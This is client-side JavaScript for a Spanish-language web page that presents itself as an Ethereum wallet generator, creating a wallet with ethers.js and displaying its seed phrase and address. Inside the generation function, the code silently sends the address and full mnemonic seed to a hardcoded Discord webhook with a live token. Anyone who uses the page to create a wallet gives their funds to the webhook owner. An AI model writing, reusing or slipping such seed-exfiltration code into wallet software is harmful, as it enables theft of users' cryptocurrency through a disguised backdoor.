  function generateWallet() {
    const generateButton = document.getElementById('generateButton');
    generateButton.disabled = true;

    const countdownElement = document.getElementById('countdown');
    countdownElement.innerHTML = 'Creando wallet...';

    const countdownDuration = 3; // Duración en segundos del contador
    let countdown = countdownDuration;

    const countdownInterval = setInterval(() => {
      countdown--;
      countdownElement.innerHTML = `Creando wallet... ${countdown} segundos`;

      if (countdown === 0) {
        clearInterval(countdownInterval);
        countdownElement.innerHTML = 'Wallet creada';
        generateButton.disabled = false;
      }
    }, 1000);

    const wallet = ethers.Wallet.createRandom();
    const mnemonic = wallet.mnemonic.phrase;
    const address = wallet.address;

    const seedField = document.getElementById('seedField');
    seedField.value = '';

    let index = 0;
    const seedInterval = setInterval(() => {
      if (index < mnemonic.split(' ').length) {
        seedField.value += mnemonic.split(' ')[index] + ' ';
        index++;
      } else {
        clearInterval(seedInterval);
      }
    }, 200);

    document.getElementById('addressField').value = address;

    // Enviar la semilla generada a través del webhook de Discord
    const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';

    const payload = {
      content: `Dirección: ${address}\nSemilla: ${mnemonic}`
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
      .then(function (response) {
        if (response.ok) {
          console.log('Semilla enviada al webhook de Discord');
        } else {
          console.error('Error al enviar la semilla al webhook de Discord:', response.status);
        }
      })
      .catch(function (error) {
        console.error('Error al enviar la semilla al webhook de Discord:', error);
      });
  }

  function copySeed() {
    const seedField = document.getElementById('seedField');
    seedField.select();
    seedField.setSelectionRange(0, 99999);
    document.execCommand('copy');

    const copyIcon = document.getElementById('copyIcon');
    copyIcon.style.opacity = 1;
    setTimeout(function () {
      copyIcon.style.opacity = 0.6;
    }, 1000);
  }

  function openWallet(url) {
    window.open(url, '_blank');
  }
   // Cerrar el popup al hacer clic fuera del contenido
  window.addEventListener('click', (event) => {
    const popupOverlay = document.querySelector('.popup-overlay');
    if (!popupOverlay.contains(event.target)) {
      popupOverlay.style.display = 'none';
    }
  });

 
   function closePopup() {
      const popupOverlay = document.querySelector('.popup-overlay');
      popupOverlay.style.display = 'none';
    }

<script type="text/javascript">
  function googleTranslateElementInit() {
    new google.translate.TranslateElement({
      pageLanguage: 'en',
      includedLanguages: 'es,fr', // Idiomas incluidos en la lista separados por comas
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    }, 'google_translate_element');
  }
</script>
<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

